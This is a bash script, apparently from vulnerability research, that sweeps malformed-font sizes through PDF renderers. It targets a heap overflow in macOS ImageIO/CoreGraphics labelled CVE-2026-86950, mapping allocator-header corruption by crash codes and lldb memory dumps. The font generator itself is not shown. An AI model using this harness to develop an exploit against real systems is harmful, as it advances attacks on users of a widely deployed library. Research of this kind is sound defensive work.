#!/bin/bash
# M3b: allocator-header strike map — L sweep across +2MB zone, rc + PNG md5 per L
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYEOF'
import sys, os
sys.path.insert(0, os.path.abspath('.'))
sys.path.insert(0, os.path.abspath('../cg-extract'))
from gen_k2 import build_font
for tag, L in (("a28k",28000),("a30k",30000),("a31k",31000),("a32k",32000),
               ("a33k",33000),("a34k",34000),("a36k",36000),("a40k",40000)):
    build_font(f"k2_{tag}.ttf", L); print(tag, L)
PYEOF
for TAG in a28k a30k a31k a32k a33k a34k a36k a40k; do
  ./venv/bin/python gen_pdf.py k2_${TAG}.pdf k2_${TAG}.ttf
  ./render k2_${TAG}.pdf >/dev/null 2>&1; RC=$?
  ./render2 k2_${TAG}.pdf out_${TAG}.png >/dev/null 2>&1; RC2=$?
  MD5=$(md5 -q out_${TAG}.png 2>/dev/null || echo nopng)
  echo "strike $TAG rc=$RC rc2=$RC2 md5=$MD5" >> strike_map.txt
done
# LLDBPLAIN forensics on 3 candidates
for TAG in a30k a32k a36k; do
  lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_${TAG}.pdf" \
    -o "continue" -k "register read" -k "thread backtrace all" \
    -k "memory read --size 8 --count 16 --format x \$x2-0x20" -k "memory region \$x2" \
    -o "quit" ./render > strike_${TAG}.txt 2>&1 || true
  grep -m1 "stop reason = EXC" strike_${TAG}.txt >> strike_map.txt || echo "$TAG: no fault under lldb" >> strike_map.txt
done
cat strike_map.txt
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/{strike_*.txt,out_*.png} findings/ 2>/dev/null
ls findings/ | wc -l
